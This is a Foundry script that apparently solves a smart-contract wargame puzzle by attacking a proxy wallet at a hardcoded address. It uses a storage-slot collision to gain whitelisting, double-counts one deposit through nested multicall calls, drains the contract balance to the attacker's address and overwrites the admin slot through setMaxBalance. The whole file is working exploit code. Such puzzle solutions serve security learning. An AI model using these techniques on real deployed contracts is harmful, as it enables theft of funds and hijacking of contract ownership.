// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ProxyC{
    function proposeNewAdmin(address) external;
    function addToWhitelist(address) external;
    function multicall(bytes[] calldata) external payable;
    function execute(address, uint256, bytes memory) external payable;
    function setMaxBalance(uint256) external;
}

contract PuzzleScript is Script{

    address myAddrr = 0xF93eE28F72069752A808bbF56f9dB51952475AE0;
    address proxyAddrr = 0x0747eF8AAa2E3d4ddc8aE67546753e1C4C2BccaC;
    ProxyC proxyC = ProxyC(proxyAddrr);

    function run() public{

        vm.startBroadcast();

        proxyC.proposeNewAdmin(myAddrr);
        proxyC.addToWhitelist(myAddrr);

        bytes[] memory data = new bytes[](2);
        data[0] = abi.encodeWithSignature("deposit()");
        bytes[] memory data2 = new bytes[](1);
        data2[0] = data[0];
        data[1] = abi.encodeWithSignature("multicall(bytes[])", data2);
        proxyC.multicall{value:0.001 ether}(data);

        proxyC.execute(myAddrr, proxyAddrr.balance,"");

        proxyC.setMaxBalance(uint256(uint160(myAddrr)));


        vm.stopBroadcast();
    }
}